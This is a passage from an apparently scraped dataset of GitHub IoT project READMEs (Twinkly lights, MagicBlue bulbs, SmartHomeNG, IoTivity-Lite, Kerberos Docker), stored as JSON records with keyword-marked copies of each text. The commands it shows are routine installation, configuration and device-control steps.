hardware. i wasn't able to control anything at all. later i wanted to connect it to my local wifi network. but popup dialog that shouldn't have appear never did so.\npublic api was promised around christmas 2016 for next season. later update from october 2016 it seems api won't be available any time soon:\napi for external control are on our dev check list, we definitely need some feedback from the community to understand which could be a proper core set to start with.\nit turned out that application uses http to control lights. i ended up with capturing network traffic and documented this private api. in the end i'm able to configure the device pretty easilly.\nas of 2020 twinkly devices can be controlled by amazon alexa and google assistant as well. mobile application now requires an account to operate lights even locally. no sign of public api for local devices though. therefore with my second device - twinkly 210 rgb+w wall i keep improving this library and cli documentation to be able to operate my devices locally and not rely on availability of manufacturer's servers.\nreferences\nunofficial documentation of private protocol and api is available online.\nthere are other projects that might be more suitable for your needs:\ntwinkly integration in home assistant\nsmartthings:\ntwinkly integration in smartthings by stevenjonsmith\ntwinkly integration in smartthings by dameon87\ntwinklytree binding for openhab\ntwinkly homekit hub for mongoose os using twinkly library for mongoose os\ntwinklywpf - .net 5 gui and api library\niobroker.twinkly - twinkly adapter for iobroker to communicate with the twinkly lights\ntwinkly.vb for homeseer\nthingzi-logic-twinkly - twinkly lights integration for node red\npython class to interact with generation i device and ida pro loader of firmware binary in twinkly twinkly little star by f-secure labs.\ncredits\nthis package was created with cookiecutter and the audreyr/cookiecutter-pypackage project template.", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000519, "year": null}, {"Unnamed: 0": 536, "autor": 536, "date": null, "content": "MagicBlue - Cheap bluetooth bulbs\nThe Magic Bulb is, as far as I know, the cheapest bluetooth RGB light bulb on the market : you can get it for as low as ~8\u20ac/9$ on sites like Gearbest. It works pretty good and comes with mobile apps.\nUnfortunately I haven't found any API or documentation for it, which is why I started this project.\nThere are multiple versions of the bulb, some of them may need development to be compatible with this project. If you have a different bulb version you can try to sniff bluetooth communications. Reverse-engineering information and pull requests are more than welcome \ud83d\ude3a\nBulb Version\nv6 v7 v8 v9 v10\nStatus \u2611\ufe0f \u2611\ufe0f \u2611\ufe0f\n\u2611\ufe0f \u2611\ufe0f\nInstallation\nHomeAssistant\nIf you want to use this project with HomeAssistant you'll need to install magicblue as described below then use the component available here: https://github.com/Betree/homeassistant-magicblue\nMagicBlue is not compatible with Windows.\nLinux\nYou must use python 3+ and have a proper Bluetooth 4.0 interface installed on your machine.\nPrerequisite\nDebian: sudo apt-get install libglib2.0-dev\nFedora: sudo dnf install glib2-devel\nInstall\nsudo pip3 install magicblue\nLibrary needs elevated permissions to use Bluetooth features. You can either run as root (required for magicblueshell), or give hcitool special capabilities (see this link)\nKnown errors\nBluepy not compiled (very common)\nIf you get an error like No such file or directory: '/usr/local/lib/python3.4/dist-packages/bluepy/bluepy-helper' or ERROR:magicblue.magicblueshell:Unexpected error with command \"ls\": Helper exited: this is a known bug in bluepy that sometimes doesn't get compiled when installed from Pypi. You can fix it by compiling the helper yourself : Go to the lib folder (usually /usr/local/lib/python3.5/dist-packages/bluepy-1.1.2-py3.5.egg/bluepy/ but could be different, especially if you're using a virtual env) and run sudo make (make should be enought for a virtual env).\nMore info: https://github.com/IanHarvey/bluepy/issues/158\nOther errors\nIf you run into problems during devices listing or connect, try to follow this procedure to ensure your Bluetooth interface works correctly : How to use manually with Gatttool page\nUsage\nPython API\nCheck the API documentation\nFrom shell\nScript must be run as root.\nYou can always specify which bluetooth adapter (default: hci0) you want to use by specifying it with the -a option.\nUsing the interactive shell\nJust launch magicblueshell as root user :\n$ sudo magicblueshell\nMagic Blue interactive shell v0.3.0\nType \"help\" for a list of available commands\n> help\n----------------------------\n| List of available commands |\n----------------------------\nCOMMAND PARAMETERS DETAILS\n------- ---------- -------\nhelp Show this help\nlist_devices List Bluetooth LE devices in range\nls // //\nlist_effects List available effects\nconnect mac_address or ID Connect to light bulb\ndisconnect Disconnect from current light bulb\nset_color name or hexadecimal value Change bulb's color\nset_warm_light intensity[0.0-1.0] Set warm light\nset_effect effect_name speed[1-20] Set an effect\nturn on|off Turn on / off the bulb\nread name|device_info|date_time Read device_info/datetime from the bulb\nexit Exit the script\n> ls\nListing Bluetooth LE devices in range for 5 minutes.Press CTRL+C to stop searching.\nID Name Mac address\n-- ---- -----------\n1 LEDBLE-1D433903 c7:17:1d:43:39:03\n^C\n> connect 1\nINFO:magicblue.magicblueshell:Connected\n> set_color red\n> exit\nBye !\nPassing command as an option\nScript can also be used by command line (for example to include it in custom shell scripts):\nusage: magicblueshell [-h] [-l LIST_COMMANDS] [-c COMMAND] [-m MAC_ADDRESS]\n[-a BLUETOOTH_ADAPTER] [-b BULB_VERSION]\nPython tool to control MagicBlue bulbs over Bluetooth\noptional arguments:\n-h, --help show this help message and exit\n-l LIST_COMMANDS, --list_commands LIST_COMMANDS\nList available commands\n-c COMMAND, --command COMMAND\nCommand to execute\n-m MAC_ADDRESS, --mac_address MAC_ADDRESS\nDevice mac address. Must be set if command given in -c\nneeds you to be connected\n-a BLUETOOTH_ADAPTER, --bluetooth_adapter BLUETOOTH_ADAPTER\nBluetooth adapter name as listed by hciconfig\n-b BULB_VERSION, --bulb-version BULB_VERSION\nBulb version as displayed in the official app\nSo if you want to change the color of bulb with mac address \"C7:17:1D:43:39:03\", just run :\nsudo magicblueshell -c 'set_color red' -m C7:17:1D:43:39:03\nContributing\nTo contribute to this repo, start with CONTRIBUTING.md then check open issues\nThe protocol isn't fully retro-engineered but Characteristics list page and How to use manually with Gatttool page should give you enough details to start working on your own implementation if you need to port this for another language / platform. On the research/bluetooth branch you'll also find capture of bluetooth packets exchanged between Android and the bulb (open hci_capture.log with Wireshark).", "link": "https://github.com/Betree/magicblue", "origin": "Github", "suborigin": "Iot", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "magicblue - cheap bluetooth bulbs\nthe magic bulb is, as far as i know, the cheapest bluetooth rgb light bulb on the market : you can get it for as low as ~8\u20ac/9$ on sites like gearbest. it works pretty good and comes with mobile apps.\nunfortunately i haven't found any api or documentation for it, which is why i started this project.\nthere are multiple versions of the bulb, some of them may need development to be compatible with this project. if you have a different bulb version you can try to sniff bluetooth communications. reverse-engineering information and pull requests are more than welcome \ud83d\ude3a\nbulb version\nv6 v7 v8 v9 v10\nstatus \u2611\ufe0f \u2611\ufe0f \u2611\ufe0f\n\u2611\ufe0f \u2611\ufe0f\ninstallation\nhomeassistant\nif you want to use this project with homeassistant you'll need to install magicblue as described below then use the component available here: https://github.com/betree/homeassistant-magicblue\nmagicblue is not compatible with windows.\nlinux\nyou must use python 3+ and have a proper bluetooth 4.0 interface installed on your machine.\nprerequisite\ndebian: sudo apt-get install libglib2.0-dev\nfedora: sudo dnf install glib2-devel\ninstall\nsudo pip3 install magicblue\nlibrary needs elevated permissions to use bluetooth features. you can either run as root (required for magicblueshell), or give hcitool special capabilities (see this link)\nknown errors\nbluepy not compiled (very common)\nif you get an error like no such file or directory: '/usr/local/lib/python3.4/dist-packages/bluepy/bluepy-helper' or error:magicblue.magicblueshell:unexpected error with command \"ls\": helper exited: this is a known bug in bluepy that sometimes doesn't get compiled when installed from pypi. you can fix it by compiling the helper yourself : go to the lib folder (usually /usr/local/lib/python3.5/dist-packages/bluepy-1.1.2-py3.5.egg/bluepy/ but could be different, especially if you're using a virtual env) and run sudo make (make should be enought for a virtual env).\nmore info: https://github.com/ianharvey/bluepy/issues/158\nother errors\nif you run into problems during devices listing or connect, try to follow this procedure to ensure your bluetooth interface works correctly : how to use manually with gatttool page\nusage\npython api\ncheck the api documentation\nfrom shell\nscript must be run as root.\nyou can always specify which bluetooth adapter (default: hci0) you want to use by specifying it with the -a option.\nusing the interactive shell\njust launch magicblueshell as root user :\n$ sudo magicblueshell\nmagic blue interactive shell v0.3.0\ntype \"help\" for a list of available commands\n> help\n----------------------------\n| list of available commands |\n----------------------------\ncommand parameters details\n------- ---------- -------\nhelp show this help\nlist_devices list bluetooth le devices in range\nls // //\nlist_effects list available effects\nconnect mac_address or id connect to light bulb\ndisconnect disconnect from current light bulb\nset_color name or hexadecimal value change bulb's color\nset_warm_light intensity[0.0-1.0] set warm light\nset_effect effect_name speed[1-20] set an effect\nturn on|off turn on / off the bulb\nread name|device_info|date_time read device_info/datetime from the bulb\nexit exit the script\n> ls\nlisting bluetooth le devices in range for 5 minutes.press ctrl+c to stop searching.\nid name mac address\n-- ---- -----------\n1 ledble-1d433903 c7:17:1d:43:39:03\n^c\n> connect 1\ninfo:magicblue.magicblueshell:connected\n> set_color red\n> exit\nbye !\npassing command as an option\nscript can also be used by command line (for example to include it in custom shell scripts):\nusage: magicblueshell [-h] [-l list_commands] [-c command] [-m mac_address]\n[-a bluetooth_adapter] [-b bulb_version]\npython -----> tool !!!  to control magicblue bulbs over bluetooth\noptional arguments:\n-h, --help show this help message and exit\n-l list_commands, --list_commands list_commands\nlist available commands\n-c command, --command command\ncommand to execute\n-m mac_address, --mac_address mac_address\ndevice mac address. must be set if command given in -c\nneeds you to be connected\n-a bluetooth_adapter, --bluetooth_adapter bluetooth_adapter\nbluetooth adapter name as listed by hciconfig\n-b bulb_version, --bulb-version bulb_version\nbulb version as displayed in the official app\nso if you want to change the color of bulb with mac address \"c7:17:1d:43:39:03\", just run :\nsudo magicblueshell -c 'set_color red' -m c7:17:1d:43:39:03\ncontributing\nto contribute to this repo, start with contributing.md then check open issues\nthe protocol isn't fully retro-engineered but characteristics list page and how to use manually with gatttool page should give you enough details to start working on your own implementation if you need to port this for another language / platform. on the research/bluetooth branch you'll also find capture of bluetooth packets exchanged between android and the bulb (open hci_capture.log with wireshark).", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000536, "year": null}, {"Unnamed: 0": 539, "autor": 539, "date": null, "content": "SmartHomeNG\nSmartHomeNG [1] is a software that serves a basis for home automation. It interconnects multiple devices using plugins to access their specific interfaces. This file contains basic information about the basic directories of SmartHomeNG.\nDeveloper documentation (part of the user documentation) and user documentation (german) can be found on www.smarthomeNG.de\nAdditional information can be found in the SmartHomeNG Wiki.\nUsed Tools\nTool Description\nSmartHomeNG was built using the Pycharm IDE.\nThe admin interface of SmartHomeNG was built using the WebStorm IDE.\nDirectory Structure\ndirectory description\nbin the main python file is based here\ndev if you plan to create a plugin then this is the folder you want to have a closer look at\ndoc Source files for the user- and developer documentation\netc the three basic configuration files smarthome.yaml, module.yaml, plugin.yaml, logic.yaml and logging.yaml are located here, you will edit these files to reflect your basic settings\nitems put here your own files for your items\nlib some more core python modules are in this directory. You won't need to change anything here\nlogics here your logic files are put\nmodules here are all loadable core-modules located (one subdirectory for every module)\nplugins here are all plugins located (one subdirectory for every plugin). The plugins have to be installed from a separate repository (smarthomeNG/plugins)\nscenes the scenes are stored here\ntests The code for the automated travis tests is stored here\ntools there are some tools which help you for creating an initial configuration\nvar everything that is changed by smarthome is put here, e.g. logfiles, cache, sqlite database etc.\nSome more detailed info on the configuration files\nAs of Version 1.5 the old conf format will still be valid but will be moved out of the docs since it's deprecated now for some time.\netc/smarthome.yaml\nUpon installation you will need to create this file and specify your location.\n# smarthome.yaml\n# look e.g. at http://www.mapcoordinates.net/de\nlat: '52.52'\nlon: '13.40'\nelev: 36\ntz: Europe/Berlin\netc/module.yaml\nUpon installation you will need to create this file and configure the modules and their parameters. On first start of SmartHomeNG this file is created from etc/module.yaml.default.\nAn example is shown below:\n# module.yaml\nhttp:\nmodule_name: http\nstarturl: admin\nadmin:\nmodule_name: admin\n#enable, if mqtt protocol is going to be used\n#mqtt:\n# module_name: mqtt\netc/plugin.yaml\nUpon installation you will need to create this file and configure the plugins and their parameters. On first start of SmartHomeNG this file is created from etc/plugin.yaml.default.\nAn example is shown below:\n# plugin.yaml\ndatabase:\nplugin_name: database\ndriver: sqlite3\nconnect:\n- database:./var/db/smarthomeng.db\n- check_same_thread:0\ncli:\nplugin_name: cli\nip: 0.0.0.0\nupdate: True\nwebsocket:\nplugin_name: visu_websocket\nknx:\nplugin_name: knx\nhost: 127.0.0.1\nport: 6720\now:\nplugin_name: onewire\nsmartvisu:\nplugin_name: visu_smartvisu\nsmartvisu_dir: /var/www/html/smartVISU\netc/logic.yaml\nIn the logic.conf you specify your logics and when they will be run. On first start of SmartHomeNG this file is created from etc/logic.yaml.default.\nAn example is shown below\n# etc/logic.yaml\nAtSunset:\nfilename: sunset.py\ncrontab: sunset\nitems/\nThis directory contains one or more item configuration files. The filename does not matter, except it has to end with '.yaml'.\n# items/global.yaml\nglobal:\nsun:\ntype: bool\nattribute: foo\nlogics/\nThis directory contains your logic files. Simple or sophisitcated python scripts. You could address your smarthome item by sh.item.path. If you want to read an item call sh.item.path() or to set an item sh.item.path(Value).\n# logics/sunset.py\nif sh.global.sun(): # if sh.global.sun() == True:\nsh.gloabl.sun(False) # set it to False", "link": "https://github.com/smarthomeNG/smarthome", "origin": "Github", "suborigin": "Iot", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "smarthomeng\nsmarthomeng [1] is a software that serves a basis for home automation. it interconnects multiple devices using plugins to access their specific interfaces. this file contains basic information about the basic directories of smarthomeng.\ndeveloper documentation (part of the user documentation) and user documentation (german) can be found on www.smarthomeng.de\nadditional information can be found in the smarthomeng wiki.\nused tools\n-----> tool !!!  description\nsmarthomeng was built using the pycharm ide.\nthe admin interface of smarthomeng was built using the webstorm ide.\ndirectory structure\ndirectory description\nbin the main python file is based here\ndev if you plan to create a plugin then this is the folder you want to have a closer look at\ndoc source files for the user- and developer documentation\netc the three basic configuration files smarthome.yaml, module.yaml, plugin.yaml, logic.yaml and logging.yaml are located here, you will edit these files to reflect your basic settings\nitems put here your own files for your items\nlib some more core python modules are in this directory. you won't need to change anything here\nlogics here your logic files are put\nmodules here are all loadable core-modules located (one subdirectory for every module)\nplugins here are all plugins located (one subdirectory for every plugin). the plugins have to be installed from a separate repository (smarthomeng/plugins)\nscenes the scenes are stored here\ntests the code for the automated travis tests is stored here\ntools there are some tools which help you for creating an initial configuration\nvar everything that is changed by smarthome is put here, e.g. logfiles, cache, sqlite database etc.\nsome more detailed info on the configuration files\nas of version 1.5 the old conf format will still be valid but will be moved out of the docs since it's deprecated now for some time.\netc/smarthome.yaml\nupon installation you will need to create this file and specify your location.\n# smarthome.yaml\n# look e.g. at http://www.mapcoordinates.net/de\nlat: '52.52'\nlon: '13.40'\nelev: 36\ntz: europe/berlin\netc/module.yaml\nupon installation you will need to create this file and configure the modules and their parameters. on first start of smarthomeng this file is created from etc/module.yaml.default.\nan example is shown below:\n# module.yaml\nhttp:\nmodule_name: http\nstarturl: admin\nadmin:\nmodule_name: admin\n#enable, if mqtt protocol is going to be used\n#mqtt:\n# module_name: mqtt\netc/plugin.yaml\nupon installation you will need to create this file and configure the plugins and their parameters. on first start of smarthomeng this file is created from etc/plugin.yaml.default.\nan example is shown below:\n# plugin.yaml\ndatabase:\nplugin_name: database\ndriver: sqlite3\nconnect:\n- database:./var/db/smarthomeng.db\n- check_same_thread:0\ncli:\nplugin_name: cli\nip: 0.0.0.0\nupdate: true\nwebsocket:\nplugin_name: visu_websocket\nknx:\nplugin_name: knx\nhost: 127.0.0.1\nport: 6720\now:\nplugin_name: onewire\nsmartvisu:\nplugin_name: visu_smartvisu\nsmartvisu_dir: /var/www/html/smartvisu\netc/logic.yaml\nin the logic.conf you specify your logics and when they will be run. on first start of smarthomeng this file is created from etc/logic.yaml.default.\nan example is shown below\n# etc/logic.yaml\natsunset:\nfilename: sunset.py\ncrontab: sunset\nitems/\nthis directory contains one or more item configuration files. the filename does not matter, except it has to end with '.yaml'.\n# items/global.yaml\nglobal:\nsun:\ntype: bool\nattribute: foo\nlogics/\nthis directory contains your logic files. simple or sophisitcated python scripts. you could address your smarthome item by sh.item.path. if you want to read an item call sh.item.path() or to set an item sh.item.path(value).\n# logics/sunset.py\nif sh.global.sun(): # if sh.global.sun() == true:\nsh.gloabl.sun(false) # set it to false", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000539, "year": null}, {"Unnamed: 0": 556, "autor": 556, "date": null, "content": "Introduction\nIoTivity-Lite is an open-source, reference implementation of the Open Connectivity Foundation (OCF) standards for the Internet of Things (IoT). Specifically, the stack realizes all the functionalities of the OCF Core Framework.\nThe challenge for the IoT ecosystem is to ensure that devices can connect securely and reliably to the Internet and to each other. The Open Connectivity Foundation (OCF), a group of industry leaders have created a (ISO/IEC) standard specification and certification program to address these challenges.\nThe OCF Core Framework provides a versatile communications layer with best-in-class security for Device-to-Device (D2D) and Device-to-Cloud (D2C) connectivity over IP. IoT interoperability is achieved through the use of consensus-derived, industry standard data models spanning an array of usage verticals. The OCF Core Framework may be harnessed alongside other IoT technologies in a synergistic fashion to lend a comprehensive and robust IoT solution.\nPlease review the following specifications for more details:\nOCF Security\nDevice Commissioning (On-boarding and Provisioning)\nCloud Connectivity\nBridging\nHeadless Configuration (Wi-Fi Easy Setup)\nThe IoTivity project was created to bring together the open-source community to accelerate the development of the framework and services required to connect the growing number of IoT devices. The IoTivity project offers device vendors and application developers royalty-free access to OCF technologies under the Apache 2.0 license.\nIoTivity stack features\nOS agnostic: The IoTivity device stack and modules work cross-platform (pure C code) and execute in an event-driven style. The stack interacts with lower level OS/hardware platform-specific functionality through a set of abstract interfaces. This decoupling of the common OCF standards related functionality from platform adaptation code promotes ease of long-term maintenance and evolution of the stack through successive releases of the OCF specifications.\nPorting layer: The platform abstraction is a set of generically defined interfaces which elicit a specific contract from implementations. The stack utilizes these interfaces to interact with the underlying OS/platform. The simplicity and boundedness of these interface definitions allow them to be rapidly implemented on any chosen OS/target. Such an implementation constitutes a \"port\".\nOptional support for static memory: On minimal environments lacking heap allocation functions, the stack may be configured to statically allocate all internal structures by setting a number of build-time parameters, which by consequence constrain the allowable workload for an application.\nC and Java APIs: The API structure and naming closely aligns with OCF specification constructs, aiding ease of understanding.\nProject directory structure\napi/*\ncontains the implementations of client/server APIs, the resource model, utility and helper functions to encode/decode to/from OCF\u2019s data model, module for encoding and interpreting type 4 UUIDs, base64 strings, OCF endpoints, and handlers for the discovery, platform and device resources.\nmessaging/coap/*\ncontains a tailored CoAP implementation.\nsecurity/*\ncontains resource handlers that implement the OCF security model.\nutils/*\ncontains a few primitive building blocks used internally by the core framework.\nonboarding_tool/*\ncontains the sample onboarding tool (OBT).\ndeps/*\ncontains external project dependencies.\ndeps/tinycbor/*\ncontains the tinyCBOR sources.\ndeps/mbedtls/*\ncontains the mbedTLS sources.\npatches/*\ncontains patches for deps/mbedTLS and need to be applied once.\ninclude/*\ncontains all common headers.\ninclude/oc_api.h\ncontains client/server APIs.\ninclude/oc_rep.h\ncontains helper functions to encode/decode to/from OCF\u2019s data model.\ninclude/oc_helpers.h\ncontains utility functions for allocating strings and arrays either dynamically from the heap or from pre-allocated memory pools.\ninclude/oc_obt.h\ncontains the collection of APIs for security onboarding and provisioning.\nport/*.h\ncollectively represents the platform abstraction.\nport/<OS>/*\ncontains adaptations for each OS.\napps/*\ncontains sample OCF applications.\npython/*\ncontains python binding using ctypes.\npython/obt_web/*\ncontains webbased onboarding tool based on python bindings and web technology.\nswig/*\ncontains instructions and code to build Java language bindings using the SWIG tool.\nOther information sources\nIoTivity.org\nC API documentation (Doxygen)\nWiki\nOCF GitHub\nOCF Specifications\nOCF data models\nplgd (OCF compliant Cloud implementation)\nplgd testing\nBuild instructions\nGrab source and dependencies using:\ngit clone --recursive https://github.com/iotivity/iotivity-lite.git\nPlease check here for build instructions:\nLinux\nWindows\nCMake (Linux & Windows)\nAndroid\nJava language bindings\nPython language bindings\nOnboarding and Provisioning\nRuning the onboarding tool\nAt this time there are four versions of the onboarding tool. The command line C version, the command line Java version, and the GUI Android version. Both command line versions are identical. It does not matter which version of the onboarding tool is used.\nFourth version of the onboarding tool is provided by the plgd/cloud project, reference implementation of the OCF Cloud. This one is available in both Apple App Store and Google Play Store.\nThe C version of the onboarding tool can be found in <iotivity-lite>/port/linux see Linux build instructions.\nA Java version of the onboarding-tool can be found in <iotivity-lite>/swig/apps/java_onboarding_tool\nThe following instructions assume the onboarding tool has been built and can run.\nSimple Step-by-Step guide for onboarding and provisioning\nThis guide assumes you are starting one discoverable device at a time. Multiple devices can be discovered and onboarded at the same time however it becomes the responsibility of the user to figure out which UUID belongs to which device.\nOnce you have successfully onboarded the samples the first time using the following step-by-step options feel free to RESET the devices and play around with different provisioning options.\nThe below steps use the command line version of the onboarding tool. The steps for the Android onboarding tool is very similar but are not described here.\n(Step 1) Onboard and Provision the Server\nThere are multiple methods to onboard and provision server and client samples. Below is given one of the many possible ways the this could be done.\nstart the server sample\nstart onboarding tool it will print a menu with many option\nType 1 Enter to Discover un-owned devices\nType 8 Enter to Take ownership of device\nType 0 Enter. If you have multiple unowned devices you will have to select the correct device from the list.\nType 4 Enter to Discover owned devices the device you just took ownership of should be listed.\nType 13 Enter to Provision ACE2. There are many ways to properly provision the device. This will give instruction for using wildcard provisioning.\nType 0 Enter. If you have multiple unowned devices you will have to select the correct device from the list.\nType 1 Enter for an auth-crypt ACE\nType 1 Enter in response to Enter number of resources in this ACE:\nType 0 Enter in response to Have resource href? [0-No, 1-Yes]:\nType 1 Enter in response to Set wildcard resource? [0-No, 1-Yes]:\nType 2 Enter to select the All discoverable resources option\nType 0 Enter in response to Enter number of resource types [0-None]:\nType 0 Enter in response to Enter number of interfaces [0-None]\nType 0 Enter for CREATE, 1 Enter for RETRIEVE, 1 Enter for UPDATE, 0 Enter for DELETE, and 1 Enter for NOTIFY.\nSuccessfully issued request to provision ACE should be printed on the screen upon success\n(Step 2) Onboard the client\nstart the client sample\nType 1 Enter to Discover un-owned devices\nType 8 Enter to Take ownership of device\nType 0 Enter. If you have multiple unowned devices you will have to select the correct device from the list.\nType 2 Enter to Discover owned devices the server and client should be listed\n(Step 3) Pair Server and Client\nStart the client and server samples\nType 12 Enter to Provision pair-wise credentials\nType 0 Enter 1 Enter to pair the client and server. If you have multiple owned devices you will have to select the correct devices from the list.\n(Step 4) Restart and Test\nThe samples should be onboarded and provisioned. Restart the server and then the client they should discover each other and run without difficulty.\nSend Feedback\nQuestions raise questions/issues through Github issues\nBugs Github issues", "link": "https://github.com/iotivity/iotivity-lite", "origin": "Github", "suborigin": "Iot", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "introduction\niotivity-lite is an open-source, reference implementation of the open connectivity foundation (ocf) standards for the internet of things (iot). specifically, the stack realizes all the functionalities of the ocf core framework.\nthe challenge for the iot ecosystem is to ensure that devices can connect securely and reliably to the internet and to each other. the open connectivity foundation (ocf), a group of industry leaders have created a (iso/iec) standard specification and certification program to address these challenges.\nthe ocf core framework provides a versatile communications layer with best-in-class security for device-to-device (d2d) and device-to-cloud (d2c) connectivity over ip. iot interoperability is achieved through the use of consensus-derived, industry standard data models spanning an array of usage verticals. the ocf core framework may be harnessed alongside other iot technologies in a synergistic fashion to lend a comprehensive and robust iot solution.\nplease review the following specifications for more details:\nocf security\ndevice commissioning (on-boarding and provisioning)\ncloud connectivity\nbridging\nheadless configuration (wi-fi easy setup)\nthe iotivity project was created to bring together the open-source community to accelerate the development of the framework and services required to connect the growing number of iot devices. the iotivity project offers device vendors and application developers royalty-free access to ocf technologies under the apache 2.0 license.\niotivity stack features\nos agnostic: the iotivity device stack and modules work cross-platform (pure c code) and execute in an event-driven style. the stack interacts with lower level os/hardware platform-specific functionality through a set of abstract interfaces. this decoupling of the common ocf standards related functionality from platform adaptation code promotes ease of long-term maintenance and evolution of the stack through successive releases of the ocf specifications.\nporting layer: the platform abstraction is a set of generically defined interfaces which elicit a specific contract from implementations. the stack utilizes these interfaces to interact with the underlying os/platform. the simplicity and boundedness of these interface definitions allow them to be rapidly implemented on any chosen os/target. such an implementation constitutes a \"port\".\noptional support for static memory: on minimal environments lacking heap allocation functions, the stack may be configured to statically allocate all internal structures by setting a number of build-time parameters, which by consequence constrain the allowable workload for an application.\nc and java apis: the api structure and naming closely aligns with ocf specification constructs, aiding ease of understanding.\nproject directory structure\napi/*\ncontains the implementations of client/server apis, the resource model, utility and helper functions to encode/decode to/from ocf\u2019s data model, module for encoding and interpreting type 4 uuids, base64 strings, ocf endpoints, and handlers for the discovery, platform and device resources.\nmessaging/coap/*\ncontains a tailored coap implementation.\nsecurity/*\ncontains resource handlers that implement the ocf security model.\nutils/*\ncontains a few primitive building blocks used internally by the core framework.\nonboarding_tool/*\ncontains the sample onboarding -----> tool !!!  (obt).\ndeps/*\ncontains external project dependencies.\ndeps/tinycbor/*\ncontains the tinycbor sources.\ndeps/mbedtls/*\ncontains the mbedtls sources.\npatches/*\ncontains patches for deps/mbedtls and need to be applied once.\ninclude/*\ncontains all common headers.\ninclude/oc_api.h\ncontains client/server apis.\ninclude/oc_rep.h\ncontains helper functions to encode/decode to/from ocf\u2019s data model.\ninclude/oc_helpers.h\ncontains utility functions for allocating strings and arrays either dynamically from the heap or from pre-allocated memory pools.\ninclude/oc_obt.h\ncontains the collection of apis for security onboarding and provisioning.\nport/*.h\ncollectively represents the platform abstraction.\nport/<os>/*\ncontains adaptations for each os.\napps/*\ncontains sample ocf applications.\npython/*\ncontains python binding using ctypes.\npython/obt_web/*\ncontains webbased onboarding tool based on python bindings and web technology.\nswig/*\ncontains instructions and code to build java language bindings using the swig tool.\nother information sources\niotivity.org\nc api documentation (doxygen)\nwiki\nocf github\nocf specifications\nocf data models\nplgd (ocf compliant cloud implementation)\nplgd testing\nbuild instructions\ngrab source and dependencies using:\ngit clone --recursive https://github.com/iotivity/iotivity-lite.git\nplease check here for build instructions:\nlinux\nwindows\ncmake (linux & windows)\nandroid\njava language bindings\npython language bindings\nonboarding and provisioning\nruning the onboarding tool\nat this time there are four versions of the onboarding tool. the command line c version, the command line java version, and the gui android version. both command line versions are identical. it does not matter which version of the onboarding tool is used.\nfourth version of the onboarding tool is provided by the plgd/cloud project, reference implementation of the ocf cloud. this one is available in both apple app store and google play store.\nthe c version of the onboarding tool can be found in <iotivity-lite>/port/linux see linux build instructions.\na java version of the onboarding-tool can be found in <iotivity-lite>/swig/apps/java_onboarding_tool\nthe following instructions assume the onboarding tool has been built and can run.\nsimple step-by-step guide for onboarding and provisioning\nthis guide assumes you are starting one discoverable device at a time. multiple devices can be discovered and onboarded at the same time however it becomes the responsibility of the user to figure out which uuid belongs to which device.\nonce you have successfully onboarded the samples the first time using the following step-by-step options feel free to reset the devices and play around with different provisioning options.\nthe below steps use the command line version of the onboarding tool. the steps for the android onboarding tool is very similar but are not described here.\n(step 1) onboard and provision the server\nthere are multiple methods to onboard and provision server and client samples. below is given one of the many possible ways the this could be done.\nstart the server sample\nstart onboarding tool it will print a menu with many option\ntype 1 enter to discover un-owned devices\ntype 8 enter to take ownership of device\ntype 0 enter. if you have multiple unowned devices you will have to select the correct device from the list.\ntype 4 enter to discover owned devices the device you just took ownership of should be listed.\ntype 13 enter to provision ace2. there are many ways to properly provision the device. this will give instruction for using wildcard provisioning.\ntype 0 enter. if you have multiple unowned devices you will have to select the correct device from the list.\ntype 1 enter for an auth-crypt ace\ntype 1 enter in response to enter number of resources in this ace:\ntype 0 enter in response to have resource href? [0-no, 1-yes]:\ntype 1 enter in response to set wildcard resource? [0-no, 1-yes]:\ntype 2 enter to select the all discoverable resources option\ntype 0 enter in response to enter number of resource types [0-none]:\ntype 0 enter in response to enter number of interfaces [0-none]\ntype 0 enter for create, 1 enter for retrieve, 1 enter for update, 0 enter for delete, and 1 enter for notify.\nsuccessfully issued request to provision ace should be printed on the screen upon success\n(step 2) onboard the client\nstart the client sample\ntype 1 enter to discover un-owned devices\ntype 8 enter to take ownership of device\ntype 0 enter. if you have multiple unowned devices you will have to select the correct device from the list.\ntype 2 enter to discover owned devices the server and client should be listed\n(step 3) pair server and client\nstart the client and server samples\ntype 12 enter to provision pair-wise credentials\ntype 0 enter 1 enter to pair the client and server. if you have multiple owned devices you will have to select the correct devices from the list.\n(step 4) restart and test\nthe samples should be onboarded and provisioned. restart the server and then the client they should discover each other and run without difficulty.\nsend feedback\nquestions raise questions/issues through github issues\nbugs github issues", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000556, "year": null}, {"Unnamed: 0": 560, "autor": 560, "date": null, "content": "Kerberos Open Source - Docker\nLicense\nThe Kerberos Open Source project is licensed with BY-NC-SA 4.0, this means that everyone can use Kerberos and modify if to their needs, in a non commercial activity.\nMore information about this license.\nWhy Kerberos?\nAs burglary is very common, we believe that video surveillance is a trivial tool in our daily lifes which helps us to feel a little bit more secure. Responding to this need, a lot of companies have started developing their own video surveillance software in the past few years.\nNowadays we have a myriad of expensive cameras, recorders, and software solutions which are mainly outdated and difficult to install and use. Kerberos Open Source goal is to solve these problems and to provide every human being in this world to have their own ecological, affordable, easy-to-use and innovative surveillance solution.\nDocker\nA Docker image (x86, ARMv7, ARMv8) is available on the Docker Hub, which contains all the necessary software to setup the Kerberos agent. Before you can run this image you will have to make sure Docker is installed. After the installation you can use docker run to get the Kerberos agent up and running; you can also opt for dockeros to create and scale your Kerberos agents.\nUse docker run\nAfter you've installed Docker, you can open a command prompt and type in following command. This will pull the kerberos image and make the web interface available on port 80 and the livestream on port 8889. You can give the container a custom name using the --name property.\ndocker run --name camera1 -p 80:80 -p 8889:8889 -d kerberos/kerberos\ndocker run --name camera2 -p 81:80 -p 8890:8889 -d kerberos/kerberos\ndocker run --name camera3 -p 82:80 -p 8891:8889 -d kerberos/kerberos\nOr use dockeros (our docker creation tool)\nWe've created a simple and small tool to auto provision and auto configure the Kerberos agents. The idea is that you define the different configurations for every camera upfront (/environments directory), and map them to into your Docker container (using volumes). The ultimate goal is to have a fully automated for provisioning your Kerberos agents in just a matter of seconds. It's 